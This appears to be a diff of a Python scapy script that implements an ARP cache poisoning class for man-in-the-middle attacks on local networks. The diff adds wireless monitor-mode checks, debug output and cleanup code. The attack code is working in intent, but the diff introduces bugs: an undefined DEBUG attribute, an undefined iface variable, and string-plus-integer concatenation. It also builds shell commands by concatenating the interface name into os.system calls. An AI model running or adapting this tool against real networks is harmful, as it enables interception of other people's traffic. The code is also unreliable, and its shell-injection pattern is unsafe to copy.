@@ -10,29 +10,32 @@ import gen_utils as gu
 conf.verb = 0 #shut the fuck up scapy
 
 
-DEBUG = False
-
-
-
-if not os.geteuid() == 0:
-    sys.exit('Script must be run as root user!')
-
 class Arp_poison:
-    def __init__(self, pub_ip, gateway, iface = "eth0"):
+    def __init__(self, pub_ip, gateway, iface = "eth0", wireless = False, DEBUG = False):
         self.iface = iface  # in case of wireless, it has to be one in monitor mode
         self.mac = get_if_hwaddr(self.iface)
         self.pub_ip = pub_ip
         self.gateway = gateway
         self.poison_pid = 0
         self.router_mac = getmacbyip(self.gateway)
-        self.wireless = False  # currently this flag needs to be set manually
-        if DEBUG:
+        self.wireless = wireless  # currently this flag needs to be set manually
+        self.debug = DEBUG
+        if self.wireless == True and os.system("iwconfig " + iface + "| grep Monitor >/dev/null 2>&1") != 0:
+            raise Exception("invalidIface")
+        if self.DEBUG:
             print self.iface
             print self.mac
             print self.gateway
             print self.router_mac
+            conf.verb = 3
         with open("/tmp/fun&games.log", "a") as f:
             f.write("Started a session on ip: " + self.pub_ip + " at " + str(datetime.now()) + "\n")
+
+
+    def __del__(self):
+        if self.poison_pid !=0:
+            os.kill(self.poison_pid, 9)
+            self.restore_arp_table()
 
 
     def __get_targets(self, subnet):
@@ -70,13 +73,17 @@ class Arp_poison:
 
 
     def poison_arp_table(self):
+        if self.wireless == True and os.system("iwconfig " + iface + "| grep Monitor >/dev/null 2>&1") != 0:
+            raise Exception("invalidIface")
         proc = Process(target = self.__send_poison)
         proc.start()
         self.poison_pid = proc.pid
+        if self.debug:
+            print "__send_poison PID: " + self.poison_pid
 
 
     def restore_arp_table(self):
-        if not self.poison_pid == 0 or not self.poison_pid == None:
+        if self.poison_pid != 0:
             os.kill(self.poison_pid, 9)
             if self.wireless == False:
                 pkt = Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op="is-at", psrc=self.gateway, hwsrc=self.router_mac)
